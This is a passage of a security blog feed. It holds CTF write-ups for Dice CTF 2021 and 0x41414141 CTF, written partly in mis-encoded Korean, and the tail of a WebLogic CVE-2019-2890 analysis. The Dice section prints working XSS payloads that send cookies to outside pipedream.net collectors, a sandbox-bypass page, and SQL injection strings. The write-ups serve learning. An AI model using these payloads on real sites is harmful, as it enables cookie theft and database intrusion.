ë©”ì„œë“œì—ì„œ ë°ì´í„°ë¥¼ ê²€ì¦í•˜ëŠ” <code>WSFilteringObjectInputStream</code> ë©”ì„œë“œë¥¼ ì´ìš©í•´ì„œ ê²€ì¦í•˜ê³  ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> tatic <span class="class"><span class="keyword">class</span> <span class="title">WSFilteringObjectInputStream</span> <span class="keyword">extends</span> <span class="title">FilteringObjectInputStream</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String firstClassName;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">WSFilteringObjectInputStream</span><span class="params">(InputStream in)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(in);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass descriptor) <span class="keyword">throws</span> ClassNotFoundException, IOException &#123;</span><br><span class="line">        Class clazz = <span class="keyword">super</span>.resloveClass(descriptor);</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.firstClassName == <span class="keyword">null</span>) &#123;</span><br><span class="line">            String className = descriptor.getName();</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                clazz.asSubclass(Subject.class);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> InvalidClassExecption(<span class="string">&quot;Internal System Error&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">this</span>.firstClassName = className;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>WSFilteringObjectInputStream</code> ë©”ì„œë“œëŠ” ìœ„ì™€ ê°™ìŠµë‹ˆë‹¤.</p><hr><h2 id="CVE-2019-2890-Point"><a href="#CVE-2019-2890-Point" class="headerlink" title=" CVE-2019-2890 Point"></a><span style="color:#21C587"></span> CVE-2019-2890 Point</h2><ul><li>ì¡°ê±´<br></li></ul><ol><li>ì›¹ ë¡œì§ì—ì„œ T3 í”„ë¡œí† ì½œì´ ì—´ë ¤ìˆì–´ì•¼í•œë‹¤.</li><li>ì›¹ ë¡œì§ì—ì„œ ì‚¬ìš©í•˜ê³  ìˆëŠ” SerializedSystemIni.dat íŒŒì¼ì„ ë¦­í•  ìˆ˜ ìˆì–´ì•¼ í•œë‹¤.</li></ol><p>ë¶„ì„ì„ í•´ë³¸ ê²°ê³¼ í•´ë‹¹ ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ ìµìŠ¤ë¥¼ í•˜ê¸° ìœ„í•´ì„œëŠ” ìœ„ 2ê°€ì§€ ì¡°ê±´ì„ ì¶©ì¡±í•´ì•¼ í•˜ëŠ” ê±° ê°™ìŠµë‹ˆë‹¤. ê¸´ ê¸€ ì½ì–´ì£¼ì…”ì„œ ê°ì‚¬í•©ë‹ˆë‹¤.</p><hr>]]></content>
      
      
      <categories>
          
          <category> CVE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE </tag>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dice CTF 2021 Write Up</title>
      <link href="2021/02/08/2021-02-08-Dice-2021-CTF/"/>
      <url>2021/02/08/2021-02-08-Dice-2021-CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/Dice%20CTF/dice%20main.png?raw=true"></p><hr><h2 id="Web-Babier-CSP-107-pts"><a href="#Web-Babier-CSP-107-pts" class="headerlink" title=" (Web) Babier CSP [107 pts]"></a><span style="color:#21C587"></span> (Web) Babier CSP [107 pts]</h2><blockquote><p>The Babier CSP challenge is a simple CSP Bypass challenge.</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">LRGWAXOY98Es0zz0QOVmag</span>==&gt;</span></span><br><span class="line"><span class="javascript">elem.onclick = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">  location = <span class="string">&quot;/?name=&quot;</span> + <span class="built_in">encodeURIComponent</span>([<span class="string">&quot;apple&quot;</span>, <span class="string">&quot;orange&quot;</span>, <span class="string">&quot;pineapple&quot;</span>, <span class="string">&quot;pear&quot;</span>][<span class="built_in">Math</span>.floor(<span class="number">4</span> * <span class="built_in">Math</span>.random())]);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>If you check the source code, you can see that the nonce value of the script tag is set as above. I thought that the admin bot was also applying the nonce value as above.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce&#x3D;LRGWAXOY98Es0zz0QOVmag&#x3D;&#x3D;&gt;alert(1)&lt;&#x2F;script&gt;</span><br><span class="line">&lt;script nonce&#x3D;LRGWAXOY98Es0zz0QOVmag&#x3D;&#x3D;&gt;location.href&#x3D;&quot;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&quot;%2bdocument.cookie&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br></p><blockquote><p>FLAG : dice{web_1s_a_stat3_0f_grac3_857720}</p></blockquote><hr><h2 id="Web-Missing-Flavortext-111-pts"><a href="#Web-Missing-Flavortext-111-pts" class="headerlink" title=" (Web) Missing Flavortext [111 pts]"></a><span style="color:#21C587"></span> (Web) Missing Flavortext [111 pts]</h2><blockquote><p> The Missing Flavortext challenge is a SQL Injection challenge that bypasses single quotas by using the features of express.js.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ([req.body.username, req.body.password].some(<span class="function"><span class="params">v</span> =&gt;</span> v.includes(<span class="string">&#x27;\&#x27;&#x27;</span>))) &#123;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In the code above, single quota is filtered using the includes function. However, this can be bypassed by passing it as an array because it only verifies strings.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;admin&amp;password[]&#x3D;1&amp;password[]&#x3D;&#39; or &#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br></p><blockquote><p>FLAG : dice{sq1i_d03sn7_3v3n_3x1s7_4nym0r3}</p></blockquote><hr><h2 id="Web-Web-Utils-121-pts"><a href="#Web-Web-Utils-121-pts" class="headerlink" title=" (Web) Web Utils [121 pts]"></a><span style="color:#21C587"></span> (Web) Web Utils [121 pts]</h2><blockquote><p>TThe Web Utils challenge is a challenge that triggers XSS using a vulnerability when receiving the req.body value.</p></blockquote><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">// view.html</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">async</span>&gt;</span></span><br><span class="line"><span class="javascript">    (<span class="keyword">async</span> () =&gt; &#123;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> id = <span class="built_in">window</span>.location.pathname.split(<span class="string">&#x27;/&#x27;</span>)[<span class="number">2</span>];</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (! id) <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> res = <span class="keyword">await</span> fetch(<span class="string">`<span class="subst">$&#123;<span class="built_in">window</span>.origin&#125;</span>/api/data/<span class="subst">$&#123;id&#125;</span>`</span>);</span></span><br><span class="line"><span class="javascript">      <span class="keyword">const</span> &#123; data, type &#125; = <span class="keyword">await</span> res.json();</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (! data || ! type ) <span class="built_in">window</span>.location = <span class="built_in">window</span>.origin;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (type === <span class="string">&#x27;link&#x27;</span>) <span class="keyword">return</span> <span class="built_in">window</span>.location = data;</span></span><br><span class="line"><span class="javascript">      <span class="keyword">if</span> (<span class="built_in">document</span>.readyState !== <span class="string">&quot;complete&quot;</span>)</span></span><br><span class="line"><span class="javascript">        <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener(<span class="string">&#x27;load&#x27;</span>, r); &#125;);</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.title = <span class="string">&#x27;Paste&#x27;</span>;</span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.querySelector(<span class="string">&#x27;div&#x27;</span>).textContent = data;</span></span><br><span class="line">    &#125;)()</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure><p>It is view.html code, and if the type is link in the middle, you can see window.location as data. And if data contains a payload such as <code>javascript:alert(1)</code>, you can trigger xss.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="keyword">async</span> (fastify) =&gt; &#123;</span><br><span class="line">  fastify.post(<span class="string">&#x27;createLink&#x27;</span>, &#123;</span><br><span class="line">    handler: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.generateUid(<span class="number">8</span>);</span><br><span class="line">      <span class="keyword">const</span> regex = <span class="keyword">new</span> <span class="built_in">RegExp</span>(<span class="string">&#x27;^https?://&#x27;</span>);</span><br><span class="line">      <span class="keyword">if</span> (! regex.test(req.body.data))</span><br><span class="line">        <span class="keyword">return</span> rep</span><br><span class="line">        </span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure><p>However, if you look at the link creation logic, the value of <code>req.body.data</code> is verified with a regular expression. So, you canâ€™t put xss payload in the link creation logic.<br></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// api.js</span></span><br><span class="line">(skip)</span><br><span class="line"></span><br><span class="line">fastify.post(<span class="string">&#x27;createPaste&#x27;</span>, &#123;</span><br><span class="line">    handler: <span class="function">(<span class="params">req, rep</span>) =&gt;</span> &#123;</span><br><span class="line">      <span class="keyword">const</span> uid = database.generateUid(<span class="number">8</span>);</span><br><span class="line">      database.addData(&#123; <span class="attr">type</span>: <span class="string">&#x27;paste&#x27;</span>, ...req.body, uid &#125;);</span><br><span class="line">      rep</span><br><span class="line">        .code(<span class="number">200</span>)</span><br><span class="line"></span><br><span class="line">(skip)</span><br></pre></td></tr></table></figure><p>However, if you look at the logic that creates the Pate, there is no verification for req.body, which causes a vulnerability here. Using this, you can give type as link and data as xss payload.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;data&quot;:&quot;javascript:alert(1)&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br><span class="line">&#123;&quot;data&quot;:&quot;javascript:location.href&#x3D;&#39;https:&#x2F;&#x2F;79a9bb50560aa2c77156e03b431dc2b3.m.pipedream.net&#x2F;&#39;%2bdocument.cookie&quot;,&quot;type&quot;:&quot;link&quot;&#125;</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br>   </p><blockquote><p>FLAG : dice{f1r5t_u53ful_j4v45cr1pt_r3d1r3ct}</p></blockquote><hr><h2 id="Web-Build-a-Panel-130-pts"><a href="#Web-Build-a-Panel-130-pts" class="headerlink" title=" (Web) Build a Panel [130 pts]"></a><span style="color:#21C587"></span> (Web) Build a Panel [130 pts]</h2><blockquote><p> The Build a Panel challenge is the challenge of reading flags using SQL Injection in the insert statement.</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">app.get(<span class="string">&#x27;/admin/debug/add_widget&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> cookies = req.cookies;</span><br><span class="line">    <span class="keyword">const</span> queryParams = req.query;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(cookies[<span class="string">&#x27;token&#x27;</span>] &amp;&amp; cookies[<span class="string">&#x27;token&#x27;</span>] == secret_token)&#123;</span><br><span class="line">        query = <span class="string">`INSERT INTO widgets (panelid, widgetname, widgetdata) VALUES (&#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;panelid&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetname&#x27;</span>]&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;queryParams[<span class="string">&#x27;widgetdata&#x27;</span>]&#125;</span>&#x27;);`</span>;</span><br><span class="line">        db.run(query, <span class="function">(<span class="params">err</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(err)&#123;</span><br><span class="line">                <span class="built_in">console</span>.log(err);</span><br><span class="line">                res.send(<span class="string">&#x27;something went wrong&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                res.send(<span class="string">&#x27;success!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>This is the logic of add_widget running on admin bot. When looking at the query, the input value is entered without any verification, so SQL Injection can be performed.<br></p><p>If we put our panelid in panelid and a query that reads flag in widgetname, a widget is created on our server, and the widget name contains <code>FLAG</code>. (panelid is stored in a cookie.)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;build-a-panel.dicec.tf&#x2F;admin&#x2F;debug&#x2F;add_widget?panelid&#x3D;pocas&amp;widgetname&#x3D;adfdaf&amp;widgetdata&#x3D;a&#39;), (&#39;pocas&#39;, (select flag from flag), &#39;&#123;&quot;type&quot;:&quot;pocas&quot;&#125;&#39;)--</span><br></pre></td></tr></table></figure><p>The payload used is as above.<br> </p><blockquote><p>FLAG : dice{ch41n_ChAIn_aNd_m0Re_cHaIn}</p></blockquote><hr><h2 id="Web-Web-IDE-196-pts"><a href="#Web-Web-IDE-196-pts" class="headerlink" title=" (Web) Web IDE [196 pts]"></a><span style="color:#21C587"></span> (Web) Web IDE [196 pts]</h2><blockquote><p>The Web IDE challenge is a challenge that bypasses iframe sandbox and triggers XSS.</p></blockquote><ul><li>Scenario<br></li></ul><ol><li>We are using <code>allow-scripts</code> as an option for iframe, and the value we input is executed by the eval function in sandbox.html.</li><li>The path to the administratorâ€™s cookie is /ide, so it is not easy to read the cookie. Because xss payload runs in /sandbox.html.</li><li>So, first you need to create a separate site and bypass the iframe sandbox.</li><li>If you bypass the iframe sandbox, you are not limited by sop, and you can freely execute xss payloads.</li><li>However, since xss payload is executed in <code>/sandbox.html</code>, it cannot read the admin cookie.</li><li>So, create an object using <code>window.open(&quot;/ide&quot;)</code>, and execute xss payload on the object to steal the cookie.<br></li></ol><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!doctype <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>xss poc<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">sendMessage</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// window open -&gt; make file -&gt; include it</span></span></span><br><span class="line"><span class="javascript">            <span class="keyword">const</span> cmd=<span class="string">&quot;[].constructor.constructor(\&quot;(async () =&gt; &#123;const res = await fetch(&#x27;https://web-ide.dicec.tf/ide/save&#x27;, &#123;method:&#x27;POST&#x27;, headers: &#123;&#x27;Content-Type&#x27;: &#x27;application/javascript&#x27;&#125;, body: &#x27;const myWindow = window.open(\\\&quot;/ide\\\&quot;); (async (myWindow) =&gt; &#123; await setTimeout( async() =&gt; &#123;await fetch(`https://en20uuq0p0wxmkp.m.pipedream.net/?flag=$&#123;myWindow.document.cookie&#125;`)&#125;, 500) &#125;)(myWindow)&#x27;&#125;); const file_name = await res.text(); const scr = document.createElement(&#x27;script&#x27;); scr.src = `/ide/saves/$&#123;file_name&#125;`; document.body.appendChild(scr);&#125;)()\&quot;)()&quot;</span></span></span><br><span class="line">            </span><br><span class="line"><span class="javascript">            <span class="keyword">await</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function">(<span class="params">r</span>) =&gt;</span> &#123; <span class="built_in">window</span>.addEventListener((<span class="string">&#x27;load&#x27;</span>), r); &#125;);</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.querySelector(<span class="string">&#x27;iframe&#x27;</span>)</span></span><br><span class="line">              .contentWindow</span><br><span class="line"><span class="javascript">              .postMessage(cmd, <span class="string">&#x27;*&#x27;</span>);  <span class="comment">// IDE -&gt; sandbox message</span></span></span><br><span class="line">        &#125;;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&#x27;x&#x27;</span> <span class="attr">onerror</span>=<span class="string">&quot;sendMessage()&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">&#x27;hh&#x27;</span> <span class="attr">src</span>=<span class="string">&quot;https://web-ide.dicec.tf/sandbox.html&quot;</span> <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>The payload used is as above.<br> </p><blockquote><p>FLAG : dice{c0uldn7_f1nd_4_b4ckr0nym_f0r_1de}</p></blockquote><hr>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0x41414141 CTF Write Up</title>
      <link href="2021/01/30/2021-01-31-0x414141410CTF/"/>
      <url>2021/01/30/2021-01-31-0x414141410CTF/</url>
      
        <content type="html"><![CDATA[<p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/team.png?raw=true"></p><p>2021ë…„ 1ì›” 26ì¼ ì €ë…ì— <code>Ainsetin</code>ë‹˜ì´ ì”¨í… ê°™ì´ í•˜ìê³  í•˜ì…”ì„œ 31ì¼ê¹Œì§€ ì°¸ì—¬ë¥¼ í–ˆì—ˆëŠ”ë° ë§ì€ ë„ì›€ì´ ë˜ì§€ ëª» í•œ ê±° ê°™ì•„ ìŠ¤ìŠ¤ë¡œ ë°˜ì„±ì„ ë§ì´ í•œ ëŒ€íšŒì…ë‹ˆë‹¤. ì—¬íŠ¼ ì´ë²ˆ ëŒ€íšŒì—ëŠ” ë²„ìŠ¤ë¥¼ íƒ€ì„œ 14ë“±ì„ í–ˆê³ , ì†”ë¸Œìˆ˜ê°€ ê·¸ë‚˜ë§ˆ ì ì€ ì›¹ 3 ë¬¸ì œì˜ Write Upì„ ì‘ì„±í•´ë³´ê² ìŠµë‹ˆë‹¤.<br></p><hr><h2 id="Web-Special-Order-pt2-490-pts"><a href="#Web-Special-Order-pt2-490-pts" class="headerlink" title=" (Web) Special Order pt2 [490 pts]"></a><span style="color:#21C587"></span> (Web) Special Order pt2 [490 pts]</h2><blockquote><p>Special Order pt2 ë¬¸ì œëŠ” ì›¹ ì• í”Œë¦¬ì¼€ì´ì…˜ ì·¨ì•½ì ì„ ì°¾ê³ , OOB XXEë¥¼ ì´ìš©í•´ì„œ flagë¥¼ ê¸ì–´ì˜¤ëŠ” ë¬¸ì œì…ë‹ˆë‹¤.</p></blockquote><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/1.png?raw=true"></p><p>ë¬¸ì œë¡œ ë“¤ì–´ì˜¤ë©´ login í¼ì´ ë³´ì´ê³ , ë°”ë¡œ ë°‘ì— íšŒì› ê°€ì… ë§í¬ê°€ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ê·¸ëŸ¬ë‹ˆ ê·¸ëƒ¥ ê°€ì…í•˜ê³ , ë¡œê·¸ì¸ì„ í•´ì£¼ë©´ ë©ë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/2.png?raw=true"></p><p>ë¡œê·¸ì¸ì„ í•˜ê³  ë“¤ì–´ì˜¤ë©´ <code>special Order</code> ë¸”ë¡œê·¸ê°€ ë‚˜ì˜¤ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆê³ , ìœ„ì— ë³´ë©´ <code>HOME</code>, <code>POST</code>, <code>POST SETTING</code>, <code>CREATE POST</code>ê°€ ìˆëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì·¨ì•½ì ì€ <code>POST SETTING</code>ì—ì„œ í„°ì§‘ë‹ˆë‹¤.<br></p><p><img src="https://github.com/wjddnjs33/image/blob/main/0x41414141/Special%20Order%20pt2/3.png?raw=true"></p><p><code>POST SETTING</code>ë¡œ ë“¤ì–´ì˜¤ë©´ í°íŠ¸ ìƒ‰ìƒê³¼ í°íŠ¸ ì‚¬ì´ì¦ˆë¥¼ ì •í•´ì„œ ë³´ë‚¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤. í•œ ë²ˆ ìš”ì²­ì„ ë³´ë‚´ í—¤ë”ë¥¼ ì¡ì•„ë³´ê² ìŠµë‹ˆë‹¤.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 33</span><br><span class="line">Content-Type: application&#x2F;json</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;color&quot; : &quot;red&quot;, &quot;size&quot;: &quot;20px&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 11:50:42 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 7</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">DONE :D</span><br></pre></td></tr></table></figure><p>ìš”ì²­ í—¤ë”ë¥¼ ë³´ë©´ ìƒ‰ìƒê³¼ ì‚¬ì´ì¦ˆë¥¼ jsonìœ¼ë¡œ ë³´ë‚´ëŠ” ê²ƒì„ ë³¼ ìˆ˜ ìˆìŠµë‹ˆë‹¤.<br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; Request</span><br><span class="line">POST &#x2F;customize HTTP&#x2F;1.1</span><br><span class="line">Host: 207.180.200.166:5000</span><br><span class="line">Content-Length: 33</span><br><span class="line">Content-Type: application&#x2F;xml</span><br><span class="line">Cookie: session&#x3D;eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYXNkZmUifQ.YBaKbw.aHQ999GYFVmDPqp_8r4y-rxraOw</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">&#123;&quot;color&quot; : &quot;red&quot;, &quot;size&quot;: &quot;20px&quot;&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; Response</span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.18.0 (Ubuntu)</span><br><span class="line">Date: Sun, 31 Jan 2021 11:52:00 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;utf-8</span><br><span class="line">Content-Length: 70</span><br><span class="line">Connection: close</span><br><span class="line">Vary: Cookie</span><br><span class="line"></span><br><span class="line">Start tag expected, &#39;&lt;&#39; not found, line 1, column 1 (&lt;string&gt;, line 1)</span><br></pre></td></tr></table></figure><p>ì—¬ê¸°ì„œ Content-Typeì„ <code>application/xml</code>ë¡œ ë°”ê¿”ì„œ ë³´ë‚´ì£¼ë©´ XML 